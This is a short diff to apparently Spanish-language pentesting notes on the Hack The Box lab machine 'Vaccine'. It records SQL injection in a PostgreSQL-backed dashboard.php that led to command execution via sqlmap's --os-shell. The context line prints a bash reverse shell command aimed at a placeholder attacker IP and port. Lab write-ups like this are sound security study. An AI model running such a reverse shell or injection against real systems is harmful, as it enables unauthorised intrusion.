@@ -86,7 +86,7 @@ os-shell> bash -c "bash -i >& /dev/tcp/<IP_atacante>/<puerto> 0>&1"
 
 ## Dónde la usé
 
-- `[[HTB/Vaccine/Vaccine]]` — parámetro `search` en `dashboard.php`, DBMS PostgreSQL, usuario de conexión era superusuario (confirmado por sqlmap: `testing if current user is DBA` → `retrieved: '1'`), lo que habilitó `COPY ... FROM PROGRAM` y por tanto `--os-shell`.
+- [[HTB/Vaccine/Vaccine]] — parámetro `search` en `dashboard.php`, DBMS PostgreSQL, usuario de conexión era superusuario (confirmado por sqlmap: `testing if current user is DBA` → `retrieved: '1'`), lo que habilitó `COPY ... FROM PROGRAM` y por tanto `--os-shell`.
 
 ---
 
